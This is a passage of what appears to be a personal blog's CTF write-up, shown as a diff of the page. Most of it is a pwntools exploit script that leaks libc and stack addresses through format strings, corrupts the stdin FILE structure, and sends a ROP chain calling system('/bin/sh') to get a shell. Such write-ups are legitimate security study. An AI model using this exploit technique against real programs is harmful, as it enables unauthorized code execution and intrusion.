+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;libc_start_main: </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> <span style=color:#007020>str</span>(<span style=color:#007020>hex</span>(libc_start_main_addr)))
+</span></span><span style=display:flex><span>base <span style=color:#666>=</span> libc_start_main_addr <span style=color:#666>-</span> (libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_start_main&#34;</span>] <span style=color:#666>+</span> <span style=color:#40a070>0xF0</span>)
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;base: </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> <span style=color:#007020>str</span>(<span style=color:#007020>hex</span>(base)))
+</span></span><span style=display:flex><span>_IO_2_1_stdin_addr <span style=color:#666>=</span> base <span style=color:#666>+</span> stdin_FILE
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;_IO_2_1_stdin_: </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> <span style=color:#007020>str</span>(<span style=color:#007020>hex</span>(_IO_2_1_stdin_addr)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo_back(<span style=color:#4070a0>&#34;%12$p&#34;</span>)
+</span></span><span style=display:flex><span>rbp_main <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;--&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#60a0b0;font-style:italic>#leak stack</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#change stdin</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name:&#34;</span>,p64(_IO_2_1_stdin_addr <span style=color:#666>+</span> <span style=color:#40a070>0x8</span> <span style=color:#666>*</span> <span style=color:#40a070>7</span>)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>])
+</span></span><span style=display:flex><span>echo_back(<span style=color:#4070a0>&#34;%16$hhn&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(_IO_2_1_stdin_addr <span style=color:#666>+</span> <span style=color:#40a070>0x83</span>) <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span style=color:#666>+</span> p64(rbp_main <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>) <span style=color:#666>+</span> p64(rbp_main <span style=color:#666>+</span> <span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;length:&#34;</span>,payload)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(payload) <span style=color:#666>-</span> <span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;length&#34;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>=</span> p64(elf_base <span style=color:#666>+</span> <span style=color:#40a070>0xD93</span>) <span style=color:#666>+</span> p64(base <span style=color:#666>+</span> libc<span style=color:#666>.</span>search(<span style=color:#4070a0>&#39;/bin/sh&#39;</span>)<span style=color:#666>.</span>next()) <span style=color:#666>+</span> p64(base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;system&#34;</span>]) <span style=color:#60a0b0;font-style:italic>#one_gadget</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;length:&#34;</span>,rop_chain)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>IO这里的攻击感觉水很深啊，还需要好好学习。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
